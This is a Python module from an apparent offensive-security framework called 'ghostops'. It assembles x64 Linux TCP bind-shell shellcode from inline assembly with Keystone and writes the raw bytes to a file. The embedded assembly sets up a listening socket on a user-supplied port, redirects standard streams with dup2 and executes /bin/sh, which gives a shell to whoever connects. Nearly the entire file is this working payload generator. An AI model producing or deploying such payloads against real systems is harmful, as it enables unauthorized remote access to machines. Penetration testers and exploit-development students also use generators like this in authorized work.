from pathlib import Path
from keystone import KsError, Ks, KS_ARCH_X86, KS_MODE_64
from ghostops.common.utils import Logger, HexConvert
from ghostops.core.base_module import BaseModule


class LinuxX64ShellBindTcp(BaseModule):
    name = "LinuxX64ShellBindTcp"
    description = "Generates TCP bind shell payload for x64 Linux system."
    author = "Awagat Dhungana <4w4647@gmail.com>"
    category = "payload"
    os = ["linux"]
    arch = ["x64"]

    @staticmethod
    def register_arguments(parser):
        parser.add_argument("--port", required=True, type=int, help="port number")
        parser.add_argument(
            "--output",
            required=True,
            type=str,
            help="Output filename for raw shellcode (e.g., ghostops.bin)",
        )

    @staticmethod
    def run(args):
        Logger.log("info", f"PORT - {args.port}")
        print()

        try:
            port_hex = HexConvert.port_to_hex(args.port)
        except Exception:
            Logger.log("flaw", "Invalid host or port provided.")
            return

        shellcode_template = f"""
push   0x29
pop    rax
cdq
push   0x2
pop    rdi
push   0x1
pop    rsi
syscall
xchg   rdi,rax
push   rdx
mov    DWORD PTR [rsp],0x{port_hex}0002
mov    rsi,rsp
push   0x10
pop    rdx
push   0x31
pop    rax
syscall
push   0x32
pop    rax
syscall
xor    rsi,rsi
push   0x2b
pop    rax
syscall
xchg   rdi,rax
push   0x3
pop    rsi
dec    rsi
push   0x21
pop    rax
syscall
jne    0x33
push   0x3b
pop    rax
cdq
movabs rbx,0x68732f6e69622f
push   rbx
mov    rdi,rsp
push   rdx
push   rdi
mov    rsi,rsp
syscall
        """

        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_64)
            encoding, _ = ks.asm(shellcode_template)
        except KsError as e:
            Logger.log("flaw", f"Assembly failed: {e}")
            return

        shellcode_bytes = bytes(encoding)
        Logger.log("good", f"Shellcode size: {len(shellcode_bytes)} bytes")

        output_path = Path(args.output)
        try:
            with open(output_path, "wb") as f:
                f.write(shellcode_bytes)
            Logger.log("good", f"Raw shellcode written to {output_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to write shellcode to file: {e}")
